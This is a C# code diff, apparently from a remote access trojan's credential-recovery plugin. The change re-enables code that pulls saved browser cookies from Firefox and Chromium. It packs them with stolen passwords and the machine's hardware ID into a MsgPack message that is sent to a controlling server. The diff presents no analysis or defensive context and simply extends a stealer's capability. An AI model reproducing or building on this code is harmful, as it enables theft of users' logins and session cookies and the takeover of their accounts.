@@ -14,22 +14,22 @@ namespace Plugin
                 new Browsers.Firefox.Firefox().CredRecovery(Credentials);
                 new Browsers.Chromium.Chromium().Recovery(Credentials);
 
-                //StringBuilder Cookies = new StringBuilder();
-                //new Browsers.Firefox.Firefox().CookiesRecovery(Cookies);
-                //new Browsers.Chromium.Chromium().CookiesRecovery(Cookies);
+                StringBuilder Cookies = new StringBuilder();
+                new Browsers.Firefox.Firefox().CookiesRecovery(Cookies);
+                new Browsers.Chromium.Chromium().CookiesRecovery(Cookies);
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
                 msgpack.ForcePathObject("Password").AsString = Credentials.ToString();
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                //msgpack.ForcePathObject("Cookies").AsString = Cookies.ToString();
+                msgpack.ForcePathObject("Cookies").AsString = Cookies.ToString();
                 Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
                 Error(ex.Message);
+                Connection.Disconnected();
             }
-            Connection.Disconnected();
         }
 
         public static void Error(string ex)
